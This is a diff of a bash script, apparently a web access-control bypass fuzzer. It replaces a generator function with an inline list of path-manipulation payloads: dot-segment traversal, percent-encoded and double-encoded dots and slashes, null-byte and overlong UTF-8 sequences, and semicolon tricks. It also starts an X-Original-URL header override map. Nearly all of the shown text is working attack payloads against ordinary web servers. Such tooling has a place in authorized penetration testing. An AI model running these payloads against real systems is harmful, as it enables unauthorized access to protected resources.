@@ -26,43 +26,6 @@ fi
 echo ""
 echo "Target URL: $FULL_URL"
 
-generate_host_path_injections() {
-    local path="$1"
-    local base_url="$2"
-
-    local injections=(
-        "/.."
-        "/%2e%2e"
-        "/."
-        "/%2e"
-        "///"
-        "//"
-        "/./"
-        "/%2e/"
-        "/;/"
-        "/../"
-        "/%2e%2e/"
-        "/..;/"
-        "/~/"
-        "/%7e/"
-        "/%00/"
-        "/%20/"
-        "/%09/"
-        "/..../"
-        "/.%2e/"
-        "/%2e./"
-        "/..%2f/"
-        "/..%252f/"
-        "/%c0%ae/"
-        "/%e0%80%ae/"
-        "/;..;/"
-    )
-
-    for inj in "${injections[@]}"; do
-        echo "${base_url}${inj}${path#/}"
-    done
-}
-
 declare -a URLS=(
     "${BASE_URL}${PATH_PART}"
     "${BASE_URL}/%2e${PATH_PART}"
@@ -105,11 +68,32 @@ declare -a URLS=(
     "${BASE_URL}${PATH_PART}/./"
     "${BASE_URL}${PATH_PART}//"
     "${BASE_URL}${PATH_PART}////"
+    "${BASE_URL}/..${PATH_PART}"
+    "${BASE_URL}/%2e%2e${PATH_PART}"
+    "${BASE_URL}/.${PATH_PART}"
+    "${BASE_URL}/%2e${PATH_PART}"
+    "${BASE_URL}///${PATH_PART}"
+    "${BASE_URL}//${PATH_PART}"
+    "${BASE_URL}/./${PATH_PART}"
+    "${BASE_URL}/%2e/${PATH_PART}"
+    "${BASE_URL}/;/${PATH_PART}"
+    "${BASE_URL}/../${PATH_PART}"
+    "${BASE_URL}/%2e%2e/${PATH_PART}"
+    "${BASE_URL}/..;/${PATH_PART}"
+    "${BASE_URL}/~/${PATH_PART}"
+    "${BASE_URL}/%7e/${PATH_PART}"
+    "${BASE_URL}/%00/${PATH_PART}"
+    "${BASE_URL}/%20/${PATH_PART}"
+    "${BASE_URL}/%09/${PATH_PART}"
+    "${BASE_URL}/..../${PATH_PART}"
+    "${BASE_URL}/.%2e/${PATH_PART}"
+    "${BASE_URL}/%2e./${PATH_PART}"
+    "${BASE_URL}/..%2f/${PATH_PART}"
+    "${BASE_URL}/..%252f/${PATH_PART}"
+    "${BASE_URL}/%c0%ae/${PATH_PART}"
+    "${BASE_URL}/%e0%80%ae/${PATH_PART}"
+    "${BASE_URL}/;..;/${PATH_PART}"
 )
-
-while IFS= read -r url; do
-    URLS+=("$url")
-done < <(generate_host_path_injections "$PATH_PART" "$BASE_URL")
 
 declare -A HEADERS=(
     ["X-Original-URL"]="$PATH_PART"
